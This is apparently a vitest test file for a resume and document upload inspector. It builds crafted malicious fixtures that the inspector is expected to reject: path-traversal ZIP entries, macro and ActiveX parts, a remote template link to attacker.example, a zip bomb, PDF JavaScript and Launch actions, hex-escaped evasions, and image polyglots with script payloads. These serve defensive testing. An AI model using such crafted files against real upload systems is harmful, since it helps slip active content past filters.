import { crc32, deflateRawSync, deflateSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { tinyJpeg, tinyPng } from "../../../test/images.js";
import { inspectDocument, inspectResume, readZipDirectory } from "./content-inspect.js";

const PDF = "application/pdf";
const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";

/** Minimal ZIP writer for crafted fixtures (stored or deflated entries, central directory, EOCD). */
function zip(entries: { name: string; data: string | Buffer; deflate?: boolean }[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const raw = Buffer.isBuffer(e.data) ? e.data : Buffer.from(e.data);
    const data = e.deflate ? deflateRawSync(raw) : raw;
    const name = Buffer.from(e.name);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(e.deflate ? 8 : 0, 8);
    lh.writeUInt32LE(crc32(raw), 14); lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(raw.length, 22); lh.writeUInt16LE(name.length, 26);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(e.deflate ? 8 : 0, 10);
    ch.writeUInt32LE(crc32(raw), 16); ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(raw.length, 24); ch.writeUInt16LE(name.length, 28);
    ch.writeUInt32LE(offset, 42);
    locals.push(lh, name, data);
    centrals.push(ch, name);
    offset += 30 + name.length + data.length;
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

const TYPES = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
const RELS = (extra = "") => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>${extra}</Relationships>`;
const docx = (over: { types?: string; rels?: string; extra?: { name: string; data: string }[] } = {}) => zip([
  { name: "[Content_Types].xml", data: over.types ?? TYPES, deflate: true },
  { name: "_rels/.rels", data: RELS() },
  { name: "word/document.xml", data: "<w:document><w:body><w:p>Asha Iyer, Java developer</w:p></w:body></w:document>", deflate: true },
  { name: "word/_rels/document.xml.rels", data: over.rels ?? RELS(), deflate: true },
  ...(over.extra ?? []),
]);

describe("DOCX: ZIP central directory, required parts, no active content", () => {
  it("accepts a plain document (stored and deflated parts)", () => {
    expect(readZipDirectory(docx()).map((e) => e.name)).toContain("word/document.xml");
    expect(inspectResume(docx(), DOCX)).toBeNull();
  });

  it("refuses non-ZIPs, other OOXML files and a ZIP that only mentions the names in its data", () => {
    expect(inspectResume(Buffer.from("%PDF-1.7 word/document.xml [Content_Types].xml"), DOCX)).toBe("BAD_CONTENT");
    expect(inspectResume(zip([{ name: "[Content_Types].xml", data: TYPES }, { name: "xl/workbook.xml", data: "<workbook/>" }]), DOCX)).toBe("BAD_CONTENT");
    // The old substring check passed this: the names are content, not entries.
    expect(inspectResume(zip([{ name: "readme.txt", data: "[Content_Types].xml word/document.xml" }]), DOCX)).toBe("BAD_CONTENT");
    expect(inspectResume(docx().subarray(0, 200), DOCX)).toBe("BAD_CONTENT"); // truncated: no central directory
  });

  it("refuses duplicate and path-traversal entry names", () => {
    expect(inspectResume(docx({ extra: [{ name: "word/document.xml", data: "<x/>" }] }), DOCX)).toBe("BAD_CONTENT");
    expect(inspectResume(docx({ extra: [{ name: "../../evil.sh", data: "x" }] }), DOCX)).toBe("BAD_CONTENT");
  });

  it("refuses macros (vbaProject.bin, macroEnabled types) and ActiveX controls", () => {
    expect(inspectResume(docx({ extra: [{ name: "word/vbaProject.bin", data: "ÐÏ\u0011à" }] }), DOCX)).toBe("ACTIVE_CONTENT");
    expect(inspectResume(docx({ types: TYPES.replace("document.main+xml", "document.macroEnabled.main+xml") }), DOCX)).toBe("ACTIVE_CONTENT");
    expect(inspectResume(docx({ extra: [{ name: "word/activeX/activeX1.xml", data: "<ax/>" }] }), DOCX)).toBe("ACTIVE_CONTENT");
  });

  it("refuses external template and OLE links (remote template injection), allows external hyperlinks", () => {
    const rel = (type: string, mode = ' TargetMode="External"') =>
      `<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="https://attacker.example/t.dotm"${mode}/>`;
    expect(inspectResume(docx({ rels: RELS(rel("attachedTemplate")) }), DOCX)).toBe("ACTIVE_CONTENT");
    expect(inspectResume(docx({ rels: RELS(rel("oleObject")) }), DOCX)).toBe("ACTIVE_CONTENT");
    expect(inspectResume(docx({ rels: RELS(rel("hyperlink")) }), DOCX)).toBeNull();
    expect(inspectResume(docx({ rels: RELS(rel("oleObject", "")) }), DOCX)).toBeNull(); // embedded OLE part, not a link
  });

  it("caps decompressed part size (zip bomb)", () => {
    const bomb = zip([
      { name: "[Content_Types].xml", data: Buffer.alloc(20 * 1024 * 1024, 0x20), deflate: true },
      { name: "word/document.xml", data: "<w/>" },
    ]);
    expect(inspectResume(bomb, DOCX)).toBe("BAD_CONTENT");
  });
});

describe("PDF: header and active content", () => {
  const pdf = (body: string) => Buffer.from(`%PDF-1.7\n${body}\n%%EOF\n`, "latin1");
  const objStm = (inner: string) => {
    const data = deflateSync(Buffer.from(inner, "latin1"));
    return Buffer.concat([Buffer.from("%PDF-1.7\n5 0 obj\n<< /Type /ObjStm /Filter /FlateDecode /Length " + data.length + " >>\nstream\n", "latin1"),
      data, Buffer.from("\nendstream\nendobj\n%%EOF\n", "latin1")]);
  };

  it("accepts a plain PDF, including resume text such as React/JS and an open action to a page", () => {
    expect(inspectResume(pdf("1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >> endobj\n4 0 obj << /Length 30 >> stream\nBT (Skills: React/JS, /JavaScript) Tj ET\nendstream endobj"), PDF)).toBeNull();
    expect(inspectResume(objStm("1 0 obj << /Type /Catalog /Pages 2 0 R >>"), PDF)).toBeNull();
  });

  it("refuses a missing header", () => {
    expect(inspectResume(Buffer.from(" %PDF-1.7"), PDF)).toBe("BAD_CONTENT");
    expect(inspectResume(Buffer.from("MZ\x90\x00"), PDF)).toBe("BAD_CONTENT");
  });

  it.each([
    ["JavaScript action", "<< /S /JavaScript /JS (app.alert(1)) >>"],
    ["JS key alone", "<< /JS 7 0 R >>"],
    ["Launch action", "<< /S /Launch /F (cmd.exe) >>"],
    ["embedded file", "<< /Type /EmbeddedFile /Length 3 >>"],
    ["embedded files name tree", "<< /Names << /EmbeddedFiles 9 0 R >> >>"],
    ["open action dictionary", "<< /OpenAction << /S /GoTo /D [3 0 R /Fit] >> >>"],
    ["open action reference", "<< /OpenAction 8 0 R >>"],
    ["hex-escaped name", "<< /S /J#61vaScript /J#53 (x) >>"],
  ])("refuses %s", (_n, body) => {
    expect(inspectResume(pdf(body), PDF)).toBe("ACTIVE_CONTENT");
  });

  it("finds active content hidden in a compressed object stream", () => {
    expect(inspectResume(objStm("1 0 obj << /S /JavaScript /JS (app.alert(1)) >>"), PDF)).toBe("ACTIVE_CONTENT");
  });
});

describe("inspectDocument: images (design A6.5 allowlist)", () => {
  it("accepts a well-formed PNG and JPEG, and checks PDF and DOCX as for resumes", () => {
    expect(inspectDocument(tinyPng(), "image/png")).toBeNull();
    expect(inspectDocument(tinyJpeg(), "image/jpeg")).toBeNull();
    // Entropy-coded data may hold stuffed FF 00 bytes, restart markers and, in a
    // progressive image, further DHT and SOS segments before the final EOI.
    const dht = Buffer.from([0xff, 0xc4, 0x00, 0x05, 0x00, 0x00, 0x00]);
    const sos = Buffer.from([0xff, 0xda, 0x00, 0x08, 1, 1, 0, 0, 0x3f, 0]);
    expect(inspectDocument(tinyJpeg(Buffer.concat([Buffer.from([0xff, 0x00, 0x11, 0xff, 0xd0, 0x22, 0xff, 0xff, 0xd1]), dht, sos,
      Buffer.from([0x33, 0xff, 0x00, 0xff, 0xd9])])), "image/jpeg")).toBeNull();
    expect(inspectDocument(Buffer.from("%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript >> >>\n%%EOF"), PDF)).toBe("ACTIVE_CONTENT");
    expect(inspectDocument(Buffer.from("PK\x03\x04 not really"), DOCX)).toBe("BAD_CONTENT");
    expect(inspectDocument(tinyPng(), "image/gif" as never)).toBe("BAD_CONTENT");
  });

  it.each([
    ["PNG with data appended after IEND (polyglot tail)", () => tinyPng(Buffer.from("<html>")), "image/png"],
    ["PNG without IEND", () => tinyPng().subarray(0, tinyPng().length - 12), "image/png"],
    ["PNG signature only", () => tinyPng().subarray(0, 8), "image/png"],
    ["a PDF declared as PNG", () => Buffer.from("%PDF-1.7\n%%EOF\n"), "image/png"],
    ["a PNG declared as JPEG", () => tinyPng(), "image/jpeg"],
    ["JPEG with data after EOI", () => tinyJpeg(Buffer.from([0xff, 0xd9, 0x3c, 0x73])), "image/jpeg"],
    ["JPEG without EOI", () => tinyJpeg(Buffer.from([0x00, 0x00])), "image/jpeg"],
    ["JPEG markers only", () => Buffer.from([0xff, 0xd8, 0xff, 0xd9]), "image/jpeg"],
    ["an HTML file declared as JPEG", () => Buffer.from("<script>alert(1)</script>"), "image/jpeg"],
    // Review polyglot: a JPEG whose scan is followed by an EOI, an appended ZIP/HTML payload and a second EOI.
    ["JPEG with an EOI, a ZIP/HTML payload and a final EOI", () => tinyJpeg(Buffer.concat([Buffer.from([0xff, 0xd9]),
      Buffer.from("PK\x03\x04<html><script>alert(1)</script></html>", "latin1"), Buffer.from([0xff, 0xd9])])), "image/jpeg"],
    ["JPEG with a second SOI inside the scan", () => tinyJpeg(Buffer.from([0xff, 0xd8, 0x00, 0xff, 0xd9])), "image/jpeg"],
    ["JPEG with an invalid marker inside the scan", () => tinyJpeg(Buffer.from([0xff, 0x7a, 0xff, 0xd9])), "image/jpeg"],
    ["JPEG with a truncated segment inside the scan", () => tinyJpeg(Buffer.from([0xff, 0xc4, 0x00, 0x40, 0xff, 0xd9])), "image/jpeg"],
    ["JPEG without a scan", () => Buffer.from([0xff, 0xd8, 0xff, 0xc0, 0x00, 0x0b, 8, 0, 1, 0, 1, 1, 1, 0x11, 0, 0xff, 0xd9]), "image/jpeg"],
  ] as const)("refuses %s", (_n, body, type) => {
    expect(inspectDocument(body(), type)).toBe("BAD_CONTENT");
  });
});
